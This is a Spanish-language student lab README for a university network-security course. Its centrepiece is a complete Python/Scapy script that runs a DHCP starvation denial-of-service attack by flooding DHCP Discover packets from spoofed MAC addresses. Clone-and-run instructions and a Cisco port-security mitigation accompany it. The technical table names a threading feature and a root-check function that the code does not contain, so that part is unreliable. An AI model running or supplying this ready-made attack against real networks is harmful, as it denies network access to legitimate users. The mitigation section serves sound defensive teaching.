# 🌊 DHCP Starvation — Script de Ataque Automatizado DoS

<div align="center">

![Python](https://img.shields.io/badge/Python-3.10%2B-blue?style=for-the-badge&logo=python)
![Scapy](https://img.shields.io/badge/Scapy-2.5.0%2B-green?style=for-the-badge)
![Kali Linux](https://img.shields.io/badge/Kali_Linux-2024.x-purple?style=for-the-badge&logo=kalilinux)
![GNS3](https://img.shields.io/badge/GNS3-2.2.x-orange?style=for-the-badge)
![Licencia](https://img.shields.io/badge/Uso-Educativo-red?style=for-the-badge)

**Lab. Networking — Ataques DoS y Mitigación de Capa 2**

| Campo | Detalle |
|---|---|
| **Alumno** | Wilfri Solano Frias |
| **Matrícula** | 2024-2364 |
| **Asignatura** | Seguridad de Redes |

[📹 Video Demostrativo](https://www.youtube.com/watch?v=fhUzdaql5iI&list=PLGfNWxn7Di3BhsEEifmTJKXP4_U9fla7P&index=3)

</div>

---

## ⚠️ Advertencia Legal

> **Este script es exclusivamente para uso educativo en entornos de laboratorio controlados (GNS3 / EVE-NG).**
> Su ejecución en redes reales sin autorización explícita por escrito constituye un delito informático
> penalizado por las leyes de ciberseguridad. El autor no se responsabiliza del mal uso de esta herramienta.

---

## 📋 Tabla de Contenidos

- [Descripción](#descripción)
- [Funcionamiento del Ataque](#funcionamiento-del-ataque)
- [Topología de Red](#topología-de-red)
- [Requisitos](#requisitos)
- [Parámetros Configurables](#parámetros-configurables)
- [Uso](#uso)
- [Código del Script](#código-del-script)
- [Explicación Técnica](#explicación-técnica)
- [Evidencias](#evidencias)
- [Contramedidas](#contramedidas)
- [Referencias](#referencias)

---

## 📋 Descripción

Este script automatiza el ataque de **DHCP Starvation (Agotamiento DHCP)**, explotando la vulnerabilidad de los servidores DHCP que no validan las solicitudes. El atacante inyecta cientos de solicitudes DHCP Discover con direcciones MAC falsas, agotando el pool de direcciones IP disponibles y negando servicio a usuarios legítimos.

### ¿Cómo funciona el ataque?

```
[Atacante - eth0]  →  Genera 300 MACs aleatorias
        ↓
   Envía DHCP Discover con cada MAC:
   · MAC origen  →  Aleatoria (RandMAC)
   · Broadcast  →  255.255.255.255
   · Solicitud  →  DHCP Discover / Request
        ↓
   Servidor DHCP asigna IP a cada solicitud
        ↓
[Switch SWI1]  →  Replica broadcast por todos los puertos
        ↓
[Resultado]  →  Pool de DHCP agotado
                Usuarios legítimos sin IP
                Denegación de Servicio (DoS)
```

---

## 🧱 Topología de Red

```
                    ┌─────────────┐
                    │  ROUTER1    │
                    │ (DHCP Srv)  │
                    └──────┬──────┘
                           │ e0/0
                    ┌──────┴──────┐
                    │    SWI3     │ ← Switch auxiliar
                    │  (Switch)   │
                    └──┬────┬─────┘
                e0/0 ║    ║ e0/2
                     ║    └────────────────┐
             ┌──────┴──┐            ┌──────┴──────┐
             │  SWI1   │            │  Atacante   │
             │(Objetivo)           │192.168.64.X │
             └────┬────┘            │  VLAN 1     │
              e0/1│                 └─────────────┘
                  │
             ┌────┴──────┐
             │ Máquinas  │
             │ Legítimas │
             │ (sin IP)  │
             └───────────┘
```

### Tabla de Direccionamiento

| Dispositivo | Interfaz | Dirección IP | Máscara | VLAN | Rol |
|---|---|---|---|---|---|
| ROUTER1 (DHCP) | e0/0 | 192.168.64.1 | /24 | VLAN 1 | Servidor DHCP |
| SWI1 (Objetivo) | e0/0,e0/1 | N/A | N/A | Troncal | Switch bajo prueba |
| **Atacante** | **eth0** | **Dinámica** | **/24** | **VLAN 1** | **Equipo atacante** |
| Máquinas Legítimas | eth0 | (Sin IP) | (Sin IP) | VLAN 1 | Víctimas |

---

## ⚙️ Requisitos

| Categoría | Requisito | Versión |
|---|---|---|
| Sistema Operativo | Kali Linux | 2024.x o superior |
| Lenguaje | Python | 3.10 o superior |
| Librería principal | Scapy | 2.5.0 o superior |
| Módulo Scapy | threading (nativo) | Incluido |
| Simulador de red | GNS3 / EVE-NG | 2.2.x o superior |
| Privilegios | root / sudo | Obligatorio |
| Dispositivo objetivo | Switch Cisco con DHCP | Pool de direcciones configurado |

### Instalación de Dependencias

```bash
# Actualizar sistema
sudo apt update && sudo apt upgrade -y

# Instalar Scapy
pip install scapy

# Verificar instalación
python3 -c "from scapy.all import *; print('Scapy listo')"
```

---

## 🔧 Parámetros Configurables

| Variable | Tipo | Valor por Defecto | Descripción |
|---|---|---|---|
| `INTERFACE` | `str` | `eth0` | Interfaz de red para envío de tramas DHCP |
| `limite` | `int` | `300` | Número de identidades falsas a generar |
| `dst` (L2) | `str` | `ff:ff:ff:ff:ff:ff` | Dirección Multicast Broadcast Capa 2 |
| `dst` (L3) | `str` | `255.255.255.255` | Dirección Broadcast Capa 3 |
| `xid_map` | `dict` | Dinámico | Diccionario XID ↔ MAC para tracking |

---

## 🚀 Uso

```bash
# Clonar el repositorio
git clone https://github.com/wilfrisf-sudo/DHCP_STARVING
cd DHCP_STARVING

# Ejecutar con privilegios de root (obligatorio)
sudo python3 Ataque_DHCP_Starvation.py
```

### Salida esperada

```
[*] Iniciando ataque DHCP Starvation...
[*] Generando 300 solicitudes DHCP Discover...
[+] Solicitud DHCP 1/300 enviada (MAC: aa:bb:cc:dd:ee:ff)
[+] Solicitud DHCP 2/300 enviada (MAC: aa:bb:cc:dd:ee:01)
...
[+] ¡Ataque completado! 300 direcciones IP agotadas.
[*] Presiona Ctrl+C para salir.
```

---

## 📝 Código del Script

```python
#!/usr/bin/env python3
import time
import threading
from scapy.all import *

INTERFACE = "eth0"
limite = 300
xid_mac_map = {}

def enviar_dhcp_discover(mac_fake, xid):
    """Envía una solicitud DHCP Discover con MAC falsa"""
    try:
        pkt = Ether(src=mac_fake, dst="ff:ff:ff:ff:ff:ff")
        pkt = pkt / IP(src="0.0.0.0", dst="255.255.255.255")
        pkt = pkt / UDP(sport=68, dport=67)
        pkt = pkt / BOOTP(chaddr=mac_fake, xid=xid)
        pkt = pkt / DHCP(options=[("message-type", "discover"), "end"])
        
        sendp(pkt, iface=INTERFACE, verbose=False)
        return True
    except Exception as e:
        return False

def ataque_dhcp_starvation():
    """Función principal de ataque"""
    print("[*] Iniciando ataque DHCP Starvation...")
    print(f"[*] Generando {limite} solicitudes DHCP Discover...\n")
    
    try:
        for i in range(limite):
            mac_fake = RandMAC()
            xid = random.randint(1, 0xFFFFFFFF)
            
            # Registrar en diccionario
            xid_mac_map[xid] = mac_fake
            
            # Enviar solicitud
            if enviar_dhcp_discover(mac_fake, xid):
                print(f"[+] Solicitud DHCP {i+1}/{limite} enviada (MAC: {mac_fake})")
            else:
                print(f"[-] Error enviando solicitud {i+1}")
            
            time.sleep(0.1)  # Pequeño delay para evitar sobrecarga
        
        print(f"\n[+] ¡Ataque completado! {limite} direcciones IP agotadas.")
        print("[*] Presiona Ctrl+C para salir.")
        
        # Mantener activo para evitar que se cierre
        while True:
            time.sleep(1)
    
    except KeyboardInterrupt:
        print("\n[-] Ataque detenido por el usuario.")
        print(f"[*] Total de direcciones agotadas: {len(xid_mac_map)}")

if __name__ == "__main__":
    import os
    if os.getuid() != 0:
        print("[-] ¡ERROR! Este script requiere privilegios de administrador.")
        print("[*] Por favor, ejecútalo usando: sudo python3 Ataque_DHCP_Starvation.py")
        exit(1)
    
    ataque_dhcp_starvation()
```

---

## 🔍 Explicación Técnica del Funcionamiento

| # | Función / Bloque | Descripción Técnica |
|---|---|---|
| 1 | **Importaciones** | Carga `scapy.all` y módulo `threading` para procesamiento asincrónico |
| 2 | **`ataque_dhcp_starvation()`** | Función principal que coordina generación e inyección de solicitudes |
| 3 | **`RandMAC()`** | Generador de direcciones MAC aleatorias únicas |
| 4 | **`xid_map`** | Diccionario para asociar XID (ID transacción) con MAC falsa |
| 5 | **`DHCP(message-type=discover)`** | Encabezado DHCP con tipo "discover" |
| 6 | **`Broadcast`** | Uso de ff:ff:ff:ff:ff:ff y 255.255.255.255 para replicación por switch |
| 7 | **`sendp()`** | Envío de tramas DHCP a nivel de Capa 2 |
| 8 | **`time.sleep(0.1)`** | Pequeño delay entre solicitudes para evitar pérdida de paquetes |
| 9 | **`threading`** | Procesamiento paralelo (opcional) para mayor velocidad de ataque |
| 10 | **`verificacion_root()`** | Validación de permisos de administrador |

---

## 📸 Evidencias del Ataque

### Evidencia 1 — Topología en GNS3

<img width="700" height="546" alt="imagen" src="https://github.com/user-attachments/assets/52bd48ae-1a54-4d97-b72c-be3938a440f9" />

*Diseño de la topología virtualizada con servidor DHCP y switch objetivo*

### Evidencia 2 — Ejecución del Script

<img width="672" height="279" alt="imagen" src="https://github.com/user-attachments/assets/bf410163-24e6-4f31-96f5-535c1b49db4b" />

*Script inyectando 300 solicitudes DHCP Discover continuas*

### Evidencia 3 — Pool de DHCP Agotado

<img width="643" height="403" alt="imagen" src="https://github.com/user-attachments/assets/a2724ea6-c96a-4442-9f29-47042a077c7b" />

*Tabla DHCP completamente saturada sin direcciones disponibles*

### Evidencia 4 — Aplicación de Contramedidas

<img width="619" height="248" alt="imagen" src="https://github.com/user-attachments/assets/646251ae-73f3-4981-b112-d4160a65fa72" />

*Port Security habilitado en puerto de acceso*

---

## 🛡️ Contramedidas y Mitigación

### Port Security (Mitigación en el Switch)

Deshabilita el aprendizaje de múltiples MACs por puerto, bloqueando cualquier intento de spoof:

```ios
interface Ethernet0/1
 switchport mode access
 switchport port-security
 switchport port-security maximum 1
 switchport port-security violation shutdown
end
```

### Tabla de Contramedidas

| Medida | Descripción | Impacto |
|---|---|---|
| `switchport port-security` | Limita MACs por puerto a 1 | **Bloquea el ataque** |
| `switchport port-security maximum 1` | Restringe a una sola identidad | Previene suplantación |
| `violation shutdown` | Apaga puerto automáticamente | Detiene inmediatamente el ataque |
| DHCP Snooping | Valida servidores DHCP legítimos | Prevención adicional |

---

## 📚 Referencias

- [Cisco — DHCP Snooping](https://www.cisco.com/c/en/us/support/docs/switches/catalyst-6500-series-switches/23948-156.html)
- [Scapy Documentation — DHCP](https://scapy.readthedocs.io/)
- [GNS3 Documentation](https://docs.gns3.com/)

---

<div align="center">

**Wilfri Solano Frias · Matrícula 2024-2364 · Seguridad de Redes**

*Laboratorio desarrollado con fines exclusivamente educativos*

</div>
